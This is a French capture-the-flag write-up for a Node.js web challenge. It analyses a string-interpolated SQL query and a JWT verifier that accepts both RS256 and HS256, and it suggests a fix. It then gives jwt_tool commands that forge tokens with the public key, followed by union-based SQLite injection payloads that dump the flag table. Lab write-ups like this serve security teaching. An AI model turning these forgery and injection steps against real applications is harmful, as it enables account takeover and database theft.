# recon
```
└─$ nmap 94.237.53.3 -p 33076 -sVC -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 10:59 GMT
Nmap scan report for 94-237-53-3.uk-lon1.upcloud.host (94.237.53.3)
Host is up (0.12s latency).

PORT      STATE SERVICE VERSION
33076/tcp open  http    Node.js Express framework
| http-title: Under Construction - Login
|_Requested resource was /auth

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.34 seconds
```

# code source analyze
## DBHelper.js
```node
    getUser(username){
        return new Promise((res, rej) => {
            db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) => {
                if (err) return rej(err);
                res(data);
            });
        });
   }
```
La ligne suivante utilise une interpolation de chaîne pour insérer le nom d'utilisateur directement dans la requête SQL :
``db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) => {``
Si l'utilisateur fournit un nom d'utilisateur malveillant, il peut injecter du code SQL arbitraire dans la requête. Par exemple, un utilisateur pourrait entrer `admin' OR '1'='1` comme nom d'utilisateur, ce qui transformerait la requête en :
`SELECT * FROM users WHERE username = 'admin' OR '1'='1'`
Cela ferait en sorte que la condition `OR '1'='1'` soit toujours vraie, renvoyant potentiellement toutes les entrées de la table des utilisateurs.

Je vais donc chercher dans quel fichier la fonction *getUser* est utilisée.
## route/index.js
```node
router.get('/', AuthMiddleware, async (req, res, next) => {
    try{
        let user = await DBHelper.getUser(req.data.username);
        if (user === undefined) {
            return res.send(`user ${req.data.username} doesn't exist in our database.`);
        }
        return res.render('index.html', { user });
    }catch (err){
        return next(err);
    }
});
```
1. **Middleware d'authentification** : `AuthMiddleware` est utilisé pour s'assurer que l'utilisateur est authentifié avant d'accéder à cette route.
2. **Récupération de l'utilisateur** : `DBHelper.getUser(req.data.username)` est utilisé pour obtenir les informations de l'utilisateur à partir de la base de données.
3. **Vérification de l'utilisateur** : Si l'utilisateur n'existe pas, une réponse indiquant que l'utilisateur n'existe pas dans la base de données est envoyée.
4. **Rendu de la vue** : Si l'utilisateur existe, la vue `index.html` est rendue avec les données de l'utilisateur.

Les middleware sont généralements utilisé pour intercepter les réquètes avant de les passées à l'application.
Je vais donc l'analysé.
## AuthMiddleware.js
```node
[***]
if (req.cookies.session === undefined) return res.redirect('/auth');
let data = await JWTHelper.decode(req.cookies.session);
req.data = {username: data.username}
next();
[***]
```
1. **Vérification du cookie de session** :
    - Si le cookie de session n'existe pas (`req.cookies.session` est `undefined`), l'utilisateur est redirigé vers la page d'authentification (`/auth`).
2. **Décodage du JWT** :
    - Si le cookie de session existe, il est décodé et enrégister dans la variable `data` à l'aide de `JWTHelper.decode`.
3. **Stockage des données de l'utilisateur** :
    - Les informations décodées (dans ce cas, le nom d'utilisateur) sont stockées dans `req.data`.
La partie `data` de la requête est donc modifié en créant un attribut `username` qui  a pour valeur le username récupérer dans le cookie (data.username).

Analysons la fonction *JWTHelper.decode*
## JWTHelper.js
```javascript
const fs = require('fs');
const jwt = require('jsonwebtoken');

// Lecture des clés privée et publique à partir de fichiers
const privateKey = fs.readFileSync('./private.key', 'utf8');
const publicKey  = fs.readFileSync('./public.key', 'utf8');

module.exports = {
    // Fonction pour signer les données et créer un jeton JWT
    async sign(data) {
        // Ajout de la clé publique aux données
        data = Object.assign(data, { pk: publicKey });
        // Création et retour du jeton signé avec l'algorithme RS256
        return await jwt.sign(data, privateKey, { algorithm: 'RS256' });
    },
    
    // Fonction pour vérifier et décoder un jeton JWT
    async decode(token) {
        // Vérification et décodage du jeton avec les algorithmes RS256 et HS256
        return await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] });
    }
};

```
Il y a une vulnérabilité à ce niveau
```node
[***]
async decode(token) { 
	return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
[***]
```
La vulnérabilité réside dans le fait que deux algorithmes de vérification sont autorisés (`RS256` et `HS256`). Voici pourquoi cela peut être problématique :
1. **Algorithmes différents** :
    - `RS256` est un algorithme asymétrique qui utilise une paire de clés publique/privée.
    - `HS256` est un algorithme symétrique qui utilise une seule clé partagée pour la signature et la vérification.
2. **Attaque possible** :
    - Un attaquant pourrait exploiter cette configuration en forgeant un jeton JWT signé avec `HS256`, en utilisant la clé publique (qui est souvent accessible publiquement) comme clé partagée. Cela permettrait à l'attaquant de créer un jeton JWT valide sans avoir accès à la clé privée.
### Solution
Pour résoudre cette vulnérabilité, vous devez restreindre les algorithmes de vérification à ceux que vous utilisez réellement pour signer vos jetons. Si vous utilisez uniquement `RS256` pour signer les jetons, vous devez spécifier uniquement cet algorithme lors de la vérification.

# Exploitation
Pour que l'injection puisse être effectuer il faudrait pouvoir insérer des injections sql dans le token et créer un jeton JWT valide avec la clé publique.
## création d'un jeton valide
Je vais donc décoder mon token (généré après inscription sur l'application web) avec le décodeur de cookie JWT :  [jwt.io](https://jwt.io/)
![Pasted image 20240518150314](https://github.com/Zelofane22/CTF-Challenge/assets/80983303/1432cdaf-1692-4a11-a5fa-ef2b8e675266)

Il existe un outil qui permet d'exploiter un token [jwt](https://github.com/ticarpi/jwt_tool)
```bash
python3 jwt_tool.py <jwt_token> -X k -pk ./pubkey.pem -I -pc username -pv dine

```
* -X k : exploitation de confusion d'algorithme (permet de signer le token avec la clé publique)
	* -pk : pour passer la clé publique récupérer dans le payload 
*Attention : copier la clé publique dans le bon format en supprimant les '\\n')*
```./pubkey.pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
0wIDAQAB
-----END PUBLIC KEY-----
```
* -I : pour l'injection (modification du header ou du payload
	* -pc : clé
	* -pv : valeur

Résultat
![Pasted image 20240518192128](https://github.com/Zelofane22/CTF-Challenge/assets/80983303/b21f6e5c-d06b-4ec9-a615-212b12721c75)

Il suffit de modifier le token dans la requête avec burpsuite et on a un résultat qui correspond à cette partie du fichier *routes/index.js*
```node
if (user === undefined) {
  return res.send(`user ${req.data.username} doesn't exist in our database.`);
}
```
![Pasted image 20240518192956](https://github.com/Zelofane22/CTF-Challenge/assets/80983303/69f1510e-cd2c-49f4-8515-f8d61571f78b)

Maintenant que nous pouvons interagir librement avec la base de données nous allons passer à la phase d'injection sql.
## injection sql
### Découverte du nombre de colonnes
A la place de `dine` je vais mettre `zelofane' order by 2-- -` puis 3, 4 ainsi de suite jusqu'a avoir une erreur de type *out of range*.
```bash
python3 jwt_tool.py <jwt_token> -X k -pk ./pubkey.pem -I -pc username -pv "zelofane' order by 4-- -"
```
![Pasted image 20240518200546](https://github.com/Zelofane22/CTF-Challenge/assets/80983303/f117dd2a-8284-41b4-8871-5602f5d72a16)


Nous avons 3 colonnes. Je vais vérifier le numéro de colonne des noms d'utilisateurs avec le payload : `' union select 1,2,3-- -`
![Pasted image 20240518203225](https://github.com/Zelofane22/CTF-Challenge/assets/80983303/7b8577c4-375c-4f18-93f7-72c63889e49b)

La colonne des nom d'utilisateurs est donc le numéro 2.

Maintenant je vais vérifier la structure de la base de données avec : `' union select 1,sql,3 from sqlite_master-- -`
![Pasted image 20240518211038](https://github.com/Zelofane22/CTF-Challenge/assets/80983303/9f0b562a-deab-458d-ae8d-f148e2cd651c)

On a donc le nom de la table et des colonnes
Il ne reste plus qu'a récupérer les informations de la table : `' union select 1,GROUP_CONCAT(top_secret_flaag),3 FROM flag_storage-- -`

☻Voila, vous avez le flag.
